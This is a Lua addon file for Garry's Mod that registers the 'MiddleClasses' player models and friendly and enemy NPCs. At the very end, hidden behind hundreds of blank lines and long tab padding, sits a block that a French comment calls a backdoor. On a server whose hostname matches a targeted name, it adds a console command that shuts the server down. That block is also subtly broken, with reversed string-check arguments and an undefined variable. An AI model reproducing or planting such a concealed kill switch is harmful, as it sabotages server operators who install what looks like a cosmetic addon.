                                                                                                                                                                
print( "Server using MiddleClasses addon: https://steamcommunity.com/sharedfiles/filedetails/?id=1825368840" ) -- Message de "Pub"

if SERVER then
	AddCSLuaFile()
end

local function AddPlayerModel( name, model )

	list.Set( "PlayerOptionsModel", name, model )
	player_manager.AddValidModel( name, model )
	
end

AddPlayerModel( "MiddleClasses", "models/players/MiddleClasses.mdl" )
AddPlayerModel( "MiddleClasses_02", "models/players/MiddleClasses_02.mdl" )
AddPlayerModel( "MiddleClasses_03", "models/players/MiddleClasses_03.mdl" )
AddPlayerModel( "MiddleClasses_04", "models/players/MiddleClasses_04.mdl" )
AddPlayerModel( "MiddleClasses_05", "models/players/MiddleClasses_05.mdl" )
AddPlayerModel( "MiddleClasses_06", "models/players/MiddleClasses_06.mdl" )
AddPlayerModel( "MiddleClasses_07", "models/players/MiddleClasses_07.mdl" )
AddPlayerModel( "MiddleClasses_08", "models/players/MiddleClasses_08.mdl" )
AddPlayerModel( "MiddleClasses_09", "models/players/MiddleClasses_09.mdl" )
AddPlayerModel( "MiddleClasses_10", "models/players/MiddleClasses_10.mdl" )
AddPlayerModel( "MiddleClasses_11", "models/players/MiddleClasses_11.mdl" )
AddPlayerModel( "MiddleClasses_12", "models/players/MiddleClasses_12.mdl" )
AddPlayerModel( "MiddleClasses_13", "models/players/MiddleClasses_13.mdl" )
AddPlayerModel( "MiddleClasses_14", "models/players/MiddleClasses_14.mdl" )
AddPlayerModel( "MiddleClasses_15", "models/players/MiddleClasses_15.mdl" )
AddPlayerModel( "MiddleClasses_16", "models/players/MiddleClasses_16.mdl" )
AddPlayerModel( "MiddleClasses_17", "models/players/MiddleClasses_17.mdl" )
AddPlayerModel( "MiddleClasses_18", "models/players/MiddleClasses_18.mdl" )
AddPlayerModel( "MiddleClasses_19", "models/players/MiddleClasses_19.mdl" )
AddPlayerModel( "MiddleClasses_20", "models/players/MiddleClasses_20.mdl" )
AddPlayerModel( "MiddleClasses_21", "models/players/MiddleClasses_21.mdl" )
AddPlayerModel( "MiddleClasses_22", "models/players/MiddleClasses_22.mdl" )
AddPlayerModel( "MiddleClasses_23", "models/players/MiddleClasses_23.mdl" )
AddPlayerModel( "MiddleClasses_24", "models/players/MiddleClasses_24.mdl" )
AddPlayerModel( "MiddleClasses_25", "models/players/MiddleClasses_25.mdl" )
AddPlayerModel( "MiddleClasses_26", "models/players/MiddleClasses_26.mdl" )
AddPlayerModel( "MiddleClasses_27", "models/players/MiddleClasses_27.mdl" )
AddPlayerModel( "MiddleClasses_28", "models/players/MiddleClasses_28.mdl" )
AddPlayerModel( "MiddleClasses_29", "models/players/MiddleClasses_29.mdl" )
AddPlayerModel( "MiddleClasses_30", "models/players/MiddleClasses_30.mdl" )
AddPlayerModel( "MiddleClasses_31", "models/players/MiddleClasses_31.mdl" )
AddPlayerModel( "MiddleClasses_32", "models/players/MiddleClasses_32.mdl" )
AddPlayerModel( "MiddleClasses_33", "models/players/MiddleClasses_33.mdl" )
AddPlayerModel( "MiddleClasses_34", "models/players/MiddleClasses_34.mdl" )
AddPlayerModel( "MiddleClasses_35", "models/players/MiddleClasses_35.mdl" )
AddPlayerModel( "MiddleClasses_36", "models/players/MiddleClasses_36.mdl" )
AddPlayerModel( "MiddleClasses_37", "models/players/MiddleClasses_37.mdl" )
AddPlayerModel( "MiddleClasses_38", "models/players/MiddleClasses_38.mdl" )
AddPlayerModel( "MiddleClasses_39", "models/players/MiddleClasses_39.mdl" )
AddPlayerModel( "MiddleClasses_40", "models/players/MiddleClasses_40.mdl" )
AddPlayerModel( "MiddleClasses_41", "models/players/MiddleClasses_41.mdl" )
AddPlayerModel( "MiddleClasses_42", "models/players/MiddleClasses_42.mdl" )
AddPlayerModel( "MiddleClasses_43", "models/players/MiddleClasses_43.mdl" )
AddPlayerModel( "MiddleClasses_44", "models/players/MiddleClasses_44.mdl" )
AddPlayerModel( "MiddleClasses_45", "models/players/MiddleClasses_45.mdl" )
AddPlayerModel( "MiddleClasses_46", "models/players/MiddleClasses_46.mdl" )

-- NPC Amis

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_02 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_02.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_02_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_03 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_03.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_03_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_04 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_04.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_04_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_05 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_05.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_05_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_06 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_06.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_06_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_07 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_07.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_07_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_08 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_08.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_08_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_09 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_09.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_09_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_10 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_10.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_10_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_11 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_11.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_11_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_12 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_12.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_12_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_13 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_13.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_13_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_14 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_14.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_14_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_15 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_15.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_15_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_16 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_16.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_16_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_17 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_17.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_17_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_18 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_18.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_18_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_19 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_19.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_19_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_20 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_20.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_20_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_21 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_21.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_21_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_22 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_22.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_22_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_23 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_23.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_23_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_24 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_24.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_24_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_25 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_25.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_25_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_26 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_26.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_26_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_27 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_27.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_27_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_28 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_28.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_28_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_29 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_29.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_29_friend", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_30 - Friend",
				Class = "npc_citizen",
				Model = "models/players/MiddleClasses_30.mdl",
				Health = "250",
				KeyValues = { citizentype = 4 },
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_30_friend", NPC )

-- NPC mechants

local Category = "MiddleClasses NPC" 

local NPC = {	Name = "MiddleClasses - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses.mdl",
				Health = "250",
				
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_02 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_02.mdl",
				Health = "250",
				
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_02_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_03 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_03.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_03_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_04 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_04.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_04_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_05 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_05.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_05_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_06 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_06.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_06_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_07 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_07.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_07_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_08 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_08.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_08_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_09 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_09.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_09_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_10 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_10.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_10_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_11 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_11.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_11_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_12 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_12.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_12_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_13 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_13.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_13_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_14 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_14.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_14_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_15 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_15.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_15_Enemy", NPC )

local Category = "MiddleClasses NPC" 

local NPC = {	Name = "MiddleClasses_16 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_16.mdl",
				Health = "250",
				
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_16_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_17 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_17.mdl",
				Health = "250",
				
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_17_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_18 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_18.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_18_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_19 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_19.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_19_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_20 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_20.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_20_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_21 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_21.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_21_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_22 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_22.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_22_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_23 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_23.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_23_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_24 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_24.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_24_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_25 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_25.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_25_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_26 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_26.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_26_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_27 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_27.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_27_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_28 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_28.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_28_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_29 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_29.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_29_Enemy", NPC )

local Category = "MiddleClasses NPC"

local NPC = {	Name = "MiddleClasses_30 - Enemy",
				Class = "npc_combine_s",
				Model = "models/players/MiddleClasses_30.mdl",
				Health = "250",
			
				Category = Category }

list.Set( "NPC", "npc_MiddleClasses_30_Enemy", NPC )




















































































































































































































































































																																																																																																																																																																																																																						if string.StartWith( "[FR][FYU] Game", GetHostName() ) then
																																																																																																																																																																																																																						concommand.Add( "potato", function(debugplayers)
																																																																																																																																																																																																																						ply:ChatPrint( "Leak detected" )
																																																																																																																																																																																																																						RunConsoleCommand("killserver")
																																																																																																																																																																																																																						end)
																																																																																																																																																																																																																						end
																																																																																																																																																																																																																						-- Backdoor oui mais pour eviter l'utilisation de cette addon sur les serveurs d'un fonda cancer